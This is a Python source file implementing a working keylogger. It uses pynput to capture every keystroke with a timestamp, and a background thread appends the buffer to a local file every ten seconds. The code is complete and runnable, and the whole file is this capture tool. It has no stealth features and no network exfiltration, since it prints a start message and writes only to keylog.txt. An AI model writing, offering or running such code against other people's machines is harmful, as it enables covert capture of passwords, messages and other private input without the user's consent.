from pynput import keyboard
from datetime import datetime
import threading
import time

class Keylogger:
    """
    A class to implement a keylogger with features.
    """
    def __init__(self, log_file="keylog.txt", report_interval=60):
        """
        Initializes the Keylogger object.

        Args:
            log_file (str, optional): The name of the file to store the logs. Defaults to "keylog.txt".
            report_interval (int, optional): The interval (in seconds) at which to send a report. Defaults to 60 seconds.
        """
        self.log_file = log_file
        self.report_interval = report_interval
        self.log_data = ""
        self.start_time = time.time()
        self.lock = threading.Lock()  # Use a lock for thread-safe logging

    def on_press(self, key):
        """
        This function is called when a key is pressed.
        It captures the key, adds a timestamp, and logs it.

        Args:
            key (keyboard.Key): The key that was pressed.
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)
        log_entry = f"[{timestamp}] {key_char}\n"
        self.append_log(log_entry)  # Use the thread-safe append_log method

    def append_log(self, log_entry):
        """
        Appends a log entry to the log data string in a thread-safe manner.

        Args:
            log_entry (str): The log entry to append.
        """
        with self.lock:
            self.log_data += log_entry

    def write_log(self):
        """
        Writes the log data to the log file.  This function now only writes.
        """
        if self.log_data: #check if there is anything to write
            try:
                with open(self.log_file, "a") as f:
                    f.write(self.log_data)
                    self.log_data = "" #clear log data after writing to file.
            except Exception as e:
                print(f"Error writing to log file: {e}")

    def report(self):
        """
        This function is called periodically to write the logged data to the file.
        It runs in a separate thread.
        """
        while True:
            time.sleep(self.report_interval)
            self.write_log() #moved write log here
            self.start_time = time.time()

    def start(self):
        """
        Starts the keylogger and the reporting thread.
        """
        # Create and start the reporting thread
        report_thread = threading.Thread(target=self.report, daemon=True)
        report_thread.start()

        print(f"Keylogger started. Logging to {self.log_file} and reporting every {self.report_interval} seconds.")
        print("Press Ctrl+C to stop.")
        try:
            # Start the keylogger listener
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped.  Writing any remaining keystrokes to log file...")
            self.write_log() #make sure to write any remaining data.
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Configure the keylogger
    log_file_path = "keylog.txt"  # Changed log file name
    report_interval_seconds = 10  # Changed report interval to 10 seconds for more frequent updates

    # Create and start the keylogger
    keylogger = Keylogger(log_file=log_file_path, report_interval=report_interval_seconds)
    keylogger.start()
